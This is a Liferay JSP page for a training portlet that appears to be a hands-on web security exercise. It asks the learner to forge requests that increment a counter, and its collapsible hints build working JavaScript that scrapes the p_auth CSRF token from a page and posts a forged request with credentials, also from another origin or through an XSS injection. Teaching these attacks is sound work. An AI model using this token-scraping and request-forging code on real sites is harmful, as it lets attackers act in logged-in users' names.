<%@ include file="/init.jsp" %>

<portlet:actionURL name="increment" var="incrementURL"></portlet:actionURL>

<aui:form action="<%= incrementURL %>" name="<portlet:namespace />fm" method="post">
	<aui:button-row>
		<aui:button type="submit" value="count"></aui:button>
	</aui:button-row>
</aui:form>

<%
String userId = String.valueOf(themeDisplay.getUserId());
String counter = portletPreferences.getValue(userId + "counter", "0");
%>

<p>
	<b>Counter:<%= counter %></b>
</p>

<h1>Instructions</h1>

<p>This portlet counts how many times are the <b>Count</b> button pressed.<p>

<ol>
	<li>Write a javascript code, which increments the counter! Check with reloading the page!</li>
	<li>Run it from another browser tab which does not point to this page!</li>
	<li>Run it from another browser which does not point to this page!</li>
	<li>Inject your js code into a webpage and check if the counter increments when you reload the injected web page!
		Use my persistent-xss portlet to store you javascript code.
	</li>
	<li>Try to steal the identity of a logged-in user, use it's p_auth and increment the counter in it's name!
		<b>Sorry, no hints for this.Not developed yet.</b>
	</li>
</ol>

<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 1">
		<p>You have to post a request to this page.
		Check the request, copy it and put into an javascript ajax requester code.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 2">
		use <b>XMLHttpRequest</b>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 3">
<pre>
var post = new XMLHttpRequest();
post.open("POST", "...the request url...", true);
post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
</pre>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 4">
		<p>This is not enough. Check all the parameters which the browser sends and copy them!</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 5">
	<p>Only the p_auth is necessary...</p>
<pre>
(function() {
  var post = new XMLHttpRequest();
  post.open("POST", "...", true);
  post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
  post.send("p_auth=here write the value of the p_auth param");
})();
</pre>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 6">
		<p>It was easy, but how can you get a valid p_auth value?</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 7">
		<p>In our example, it is not necessary to log in, so you can get a p_auth with a get request.
		Do a get request and hunt for the p_auth value in the response!
		</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 8">
	<p>Only the p_auth is necessary...</p>
<pre>
var get = new XMLHttpRequest();
get.open("GET", "...url for a simple page load...", true);
get.onreadystatechange = function() {
	if(get.readyState == XMLHttpRequest.DONE && get.status == 200) {
	    var pauth=get.responseText.match(/p_auth\&\#x3d;[^"]*/)[0].split(";")[1];
	  	console.log(pauth);
	}
};
  
get.send();
</pre>
	</liferay-ui:panel>

	<liferay-ui:panel collapsible="true" state="closed" title="hint 9">
	<p>Put the two codes together:</p>
<pre>
(function() {
  var get = new XMLHttpRequest();
  var post = new XMLHttpRequest();
  post.open("POST", "..post request when pressed the counter...", true);
  post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
  get.open("GET", "...page load request ...", true);
  get.onreadystatechange = function() {
    if(get.readyState == XMLHttpRequest.DONE && get.status == 200) {
      	console.log(get);
        var pauth=get.responseText.match(/p_auth\&\#x3d;[^"]*/)[0].split(";")[1];
      	console.log(pauth);
        post.send("p_auth="+pauth);
    }
  };
  
  get.send();
})();
</pre>
	</liferay-ui:panel>	
		<liferay-ui:panel collapsible="true" state="closed" title="hint 10">
	<p>Check xmlhttprequest withcredential (maybe from other domain):</p>
<pre>
(function() {
  var get = new XMLHttpRequest();
  var post = new XMLHttpRequest();
  get.withCredentials = true;
  post.withCredentials = true;
  post.open("POST", "..post request when pressed the counter...", true);
  post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
  get.open("GET", "...page load request ...", true);
  get.onreadystatechange = function() {
    if(get.readyState == XMLHttpRequest.DONE && get.status == 200) {
      	console.log(get);
        var pauth=get.responseText.match(/p_auth\&\#x3d;[^"]*/)[0].split(";")[1];
      	console.log(pauth);
        post.send("p_auth="+pauth);
    }
  };
  
  get.send();
})();
</pre>
	</liferay-ui:panel>	
</liferay-ui:panel-container>
